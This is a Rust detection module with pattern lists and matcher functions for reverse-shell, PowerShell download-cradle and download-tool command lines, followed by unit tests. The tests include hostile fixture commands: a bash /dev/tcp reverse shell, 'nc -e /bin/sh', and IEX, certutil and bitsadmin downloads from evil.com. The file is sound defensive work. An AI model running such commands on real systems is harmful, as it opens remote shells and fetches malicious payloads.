/// Substrings indicative of reverse-shell command lines.
///
/// Sources:
/// - PayloadsAllTheThings — reverse shell cheat sheet (community-maintained):
///   <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md>
/// - MITRE ATT&CK T1059 — Command and Scripting Interpreter:
///   <https://attack.mitre.org/techniques/T1059/>
/// - SANS FOR508 — incident response reverse shell indicators
pub const REVERSE_SHELL_PATTERNS: &[&str] = &[
    "bash -i",
    "sh -i",
    "pty.spawn",
    "nc -e",
    "nc -c",
    "ncat -e",
    "/bin/sh -i",
    "python -c",
    "perl -e",
    "ruby -e",
    "lua -e",
    "php -r",
    "socat exec",
    "openssl s_client",
];

/// Substrings indicative of PowerShell abuse / download-cradles.
///
/// Sources:
/// - MITRE ATT&CK T1059.001 — PowerShell:
///   <https://attack.mitre.org/techniques/T1059/001/>
/// - Red Canary — PowerShell abuse patterns:
///   <https://redcanary.com/threat-detection-report/threats/powershell/>
/// - FireEye/Mandiant — Invoke-Expression and encoded command abuse
///   (referenced in: <https://www.mandiant.com/resources/blog/bring-your-own-land-novel-red-teaming-technique>)
pub const POWERSHELL_ABUSE_PATTERNS: &[&str] = &[
    "IEX",
    "Invoke-Expression",
    "DownloadString",
    "WebClient",
    "Net.WebRequest",
    "-EncodedCommand",
    "-enc ",
    "-ep bypass",
    "-ExecutionPolicy Bypass",
    "FromBase64String",
    "Invoke-Mimikatz",
    "Invoke-Shellcode",
];

/// Substrings indicative of file-download tool usage.
///
/// Sources:
/// - MITRE ATT&CK T1105 — Ingress Tool Transfer:
///   <https://attack.mitre.org/techniques/T1105/>
/// - MITRE ATT&CK T1218.003 — CMSTP / certutil abuse:
///   <https://attack.mitre.org/techniques/T1218/>
/// - SANS — certutil as a download cradle:
///   <https://www.sans.org/blog/certutil-qualifications/>
/// - Red Canary — BITSAdmin transfer abuse:
///   <https://redcanary.com/threat-detection-report/threats/bitsadmin/>
pub const DOWNLOAD_TOOL_PATTERNS: &[&str] = &[
    "certutil -urlcache",
    "certutil -decode",
    "bitsadmin /transfer",
    "wget ",
    "curl ",
    "Invoke-WebRequest",
    "Start-BitsTransfer",
    "mshta http",
    "regsvr32 /s /n /u /i:http",
];

/// Returns `true` if `cmd` contains a reverse-shell pattern (case-insensitive).
pub fn is_reverse_shell_pattern(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    REVERSE_SHELL_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_ascii_lowercase()))
}

/// Returns `true` if `cmd` contains a PowerShell abuse pattern (case-insensitive).
pub fn is_powershell_abuse(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    POWERSHELL_ABUSE_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_ascii_lowercase()))
}

/// Returns `true` if `cmd` contains a download-tool usage pattern (case-insensitive).
pub fn is_download_tool_usage(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    DOWNLOAD_TOOL_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_ascii_lowercase()))
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- constant membership ---
    #[test]
    fn reverse_shell_patterns_contains_bash_i() {
        assert!(REVERSE_SHELL_PATTERNS.contains(&"bash -i"));
    }

    #[test]
    fn reverse_shell_patterns_contains_nc_e() {
        assert!(REVERSE_SHELL_PATTERNS.contains(&"nc -e"));
    }

    #[test]
    fn powershell_abuse_contains_iex() {
        assert!(POWERSHELL_ABUSE_PATTERNS.contains(&"IEX"));
    }

    #[test]
    fn powershell_abuse_contains_encoded_command() {
        assert!(POWERSHELL_ABUSE_PATTERNS.contains(&"-EncodedCommand"));
    }

    #[test]
    fn download_tool_contains_certutil_urlcache() {
        assert!(DOWNLOAD_TOOL_PATTERNS.contains(&"certutil -urlcache"));
    }

    #[test]
    fn download_tool_contains_wget() {
        assert!(DOWNLOAD_TOOL_PATTERNS.contains(&"wget "));
    }

    // --- is_reverse_shell_pattern ---
    #[test]
    fn detects_bash_i_reverse_shell() {
        assert!(is_reverse_shell_pattern(
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        ));
    }

    #[test]
    fn detects_nc_e_reverse_shell() {
        assert!(is_reverse_shell_pattern("nc -e /bin/sh 10.0.0.1 4444"));
    }

    #[test]
    fn detects_python_c_pty_spawn() {
        assert!(is_reverse_shell_pattern(
            "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
        ));
    }

    #[test]
    fn detects_case_insensitive_nc_e() {
        assert!(is_reverse_shell_pattern("NC -E /bin/sh attacker 4444"));
    }

    #[test]
    fn does_not_flag_benign_command() {
        assert!(!is_reverse_shell_pattern("ls -la /tmp"));
    }

    // Edge: empty
    #[test]
    fn empty_string_not_reverse_shell() {
        assert!(!is_reverse_shell_pattern(""));
    }

    // --- is_powershell_abuse ---
    #[test]
    fn detects_iex_downloadstring() {
        assert!(is_powershell_abuse(
            "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')"
        ));
    }

    #[test]
    fn detects_encoded_command_flag() {
        assert!(is_powershell_abuse("powershell.exe -EncodedCommand AAAA"));
    }

    #[test]
    fn detects_ep_bypass() {
        assert!(is_powershell_abuse(
            "powershell -ep bypass -File stager.ps1"
        ));
    }

    #[test]
    fn does_not_flag_benign_powershell() {
        assert!(!is_powershell_abuse("Get-Process"));
    }

    // Edge: empty
    #[test]
    fn empty_string_not_powershell_abuse() {
        assert!(!is_powershell_abuse(""));
    }

    // --- is_download_tool_usage ---
    #[test]
    fn detects_certutil_urlcache() {
        assert!(is_download_tool_usage(
            "certutil -urlcache -f http://evil.com/payload.exe payload.exe"
        ));
    }

    #[test]
    fn detects_bitsadmin_transfer() {
        assert!(is_download_tool_usage(
            "bitsadmin /transfer job http://evil.com/x.exe C:\\x.exe"
        ));
    }

    #[test]
    fn detects_wget_uppercase() {
        assert!(is_download_tool_usage("WGET http://evil.com/malware"));
    }

    #[test]
    fn does_not_flag_dir_command() {
        assert!(!is_download_tool_usage("dir C:\\Windows\\System32"));
    }

    // Edge: empty
    #[test]
    fn empty_string_not_download_tool() {
        assert!(!is_download_tool_usage(""));
    }
}
